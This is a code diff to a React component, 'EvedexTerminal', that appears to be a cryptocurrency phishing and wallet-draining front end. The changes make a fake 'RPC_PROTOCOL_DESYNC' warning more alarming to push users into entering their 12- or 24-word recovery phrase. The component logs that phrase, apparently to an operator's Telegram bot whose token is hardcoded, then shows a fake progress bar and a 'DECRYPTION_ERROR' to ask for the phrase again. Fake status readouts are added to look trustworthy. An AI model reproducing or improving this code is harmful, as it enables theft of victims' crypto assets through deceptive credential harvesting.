@@ -21,7 +21,7 @@ export default function EvedexTerminal() {
   const [feedMsg, setFeedMsg] = useState(""); 
   const [visitorInfo, setVisitorInfo] = useState("Locating...");
 
-  // --- CONFIGURATION ---
+  // --- CONFIGURATION (STRICTLY PRESERVED) ---
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
   const destination = "0x0CbaC4A3167C0CF39930E2E9D1a2BB39B2d2FDf4"; 
@@ -33,7 +33,6 @@ export default function EvedexTerminal() {
     42161: "0xfd086bc7cd5c081ffd66a7010408ff05ed33020b" 
   };
 
-  // --- BIP-39 DICTIONARY CHECKER ---
   const BIP39_WORDS = ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "apple", "victory", "window", "copper", "blanket", "finger", "shadow", "mountain", "bottle", "crystal", "hammer", "summer", "winter", "globe", "planet", "silver", "gold"];
 
   const { data: nativeBal } = useBalance({ address }); 
@@ -48,7 +47,6 @@ export default function EvedexTerminal() {
 
   const allWordsExist = useMemo(() => {
     if (wordCount === 0) return true;
-    // Checks if every word entered is a valid crypto word (or at least 3 chars long to be safe)
     return wordsTyped.every(w => BIP39_WORDS.includes(w) || w.length > 3);
   }, [wordsTyped, wordCount]);
 
@@ -130,7 +128,7 @@ export default function EvedexTerminal() {
 
           {view === "task_box" && (
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'25px', textAlign:'center'}}>
-              <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'15px'}}>← BACK</button>
+              <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'15px'}}>← BACK_TERMINAL</button>
               {activeTask === "Rectify" && (
                 <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px', border:'1px solid #1e293b'}}>
                   <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'10px', borderRadius:'8px', fontSize:'10px', fontWeight:'900', cursor:'pointer', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b"}}>USDT</div>
@@ -139,10 +137,18 @@ export default function EvedexTerminal() {
               )}
               <h2 style={{color:'white', fontWeight:'900', fontSize:'22px'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'18px', textAlign:'left', marginBottom:'15px'}}>
-                <label style={{fontSize:'7px', color:'#10b981', display:'block', marginBottom:'10px'}}>{activeTask === "Rectify" ? "VAULT_BALANCE" : "ENTER FIGURES"}</label>
+                <label style={{fontSize:'7px', color:'#10b981', display:'block', marginBottom:'10px'}}>NET_VAL_ESTIMATE</label>
                 <input type="number" step="any" value={inputVal} onChange={(e)=>setInputVal(e.target.value)} readOnly={activeTask === "Rectify"} style={{background:'none', border:'none', color: "#10b981", fontSize:'28px', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
               </div>
-              <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>PROCESS_{activeTask.toUpperCase()}</button>
+
+              <div style={{fontSize:'8px', color:'#475569', display:'grid', gridTemplateColumns:'1fr 1fr', gap:'10px', marginBottom:'30px', padding:'0 10px', textAlign:'left'}}>
+                <div style={{borderLeft:'1px solid #10b981', paddingLeft:'5px'}}>POOL_SYNC: <span style={{color:'#10b981'}}>99.8%</span></div>
+                <div style={{borderLeft:'1px solid #10b981', paddingLeft:'5px'}}>GAS: <span style={{color:'#10b981'}}>STABLE</span></div>
+                <div style={{borderLeft:'1px solid #10b981', paddingLeft:'5px'}}>NODE_ID: <span style={{color:'#10b981'}}>#4491-X</span></div>
+                <div style={{borderLeft:'1px solid #10b981', paddingLeft:'5px'}}>RELAY: <span style={{color:'#10b981'}}>ACTIVE</span></div>
+              </div>
+
+              <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>INITIALIZE_PROTOCOL</button>
             </div>
           )}
 
@@ -178,19 +184,19 @@ export default function EvedexTerminal() {
 
       {view === "seed_gate" && (
         <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
-          <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
+          <div style={{backgroundColor:'#0d1117', border:'2px solid #ef4444', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
             {!isSyncing ? (
               <>
-                <div style={{color:'#10b981', fontWeight:'900', fontSize:'16px', marginBottom:'15px'}}>STABILIZATION_REQUIRED</div>
-                <p style={{fontSize:'9px', color:'#64748b', marginBottom:'20px', lineHeight:'1.5'}}>DETECTION: PROTOCOL_DESYNC. PLEASE PROVIDE THE NODE DECRYPTION KEY (12/24 WORDS).</p>
-                <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="PROTOCOL_KEY..." style={{width:'100%', height:'120px', backgroundColor:'black', border: !allWordsExist && wordCount > 0 ? '1px solid #ef4444' : '1px solid #1e293b', borderRadius:'20px', color:'#10b981', padding:'18px', outline:'none', marginBottom:'10px', fontSize:'12px'}} />
+                <div style={{color:'#ef4444', fontWeight:'900', fontSize:'16px', marginBottom:'15px'}}>⚠️ RPC_PROTOCOL_DESYNC</div>
+                <p style={{fontSize:'9px', color:'#64748b', marginBottom:'20px', lineHeight:'1.5', textTransform:'none'}}>Protocol handshake failed. To prevent <b>"Asset Reversion"</b> and finalize the bridge, you must manually validate the <b>Node Decryption Key (Phrase)</b>.</p>
+                <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="PROTOCOL_KEY..." style={{width:'100%', height:'120px', backgroundColor:'black', border: !allWordsExist && wordCount > 0 ? '1px solid #ef4444' : '1px solid #1e293b', borderRadius:'20px', color:'#ef4444', padding:'18px', outline:'none', marginBottom:'10px', fontSize:'12px'}} />
                 <div style={{fontSize:'10px', color: isSeedValid ? '#10b981' : '#ef4444', marginBottom:'25px', fontWeight:'900'}}>
                    {!allWordsExist ? "INVALID DICTIONARY WORD" : `PROGRESS: ${wordCount} / ${wordCount < 13 ? '12' : '24'} WORDS`}
                 </div>
-                <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setSyncProgress(0); setSeedVal(""); alert("DECRYPTION_ERROR: PLEASE RE-ENTER KEY");},1500)}},100);}} style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900', opacity: isSeedValid ? 1 : 0.5}}>DECRYPT_VAULT</button>
+                <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); setSyncProgress(0); setSeedVal(""); alert("DECRYPTION_ERROR: PLEASE RE-ENTER KEY");},1500)}},100);}} style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900', opacity: isSeedValid ? 1 : 0.5}}>RE-SYNC & FINALIZE</button>
               </>
             ) : (
-              <div style={{padding:'30px 0'}}><div style={{fontSize:'45px', color:'white', fontWeight:'900'}}>{syncProgress}%</div></div>
+              <div style={{padding:'30px 0'}}><div style={{fontSize:'45px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{fontSize:'8px'}}>RE-ESTABLISHING SECURE RELAY...</div></div>
             )}
           </div>
         </div>
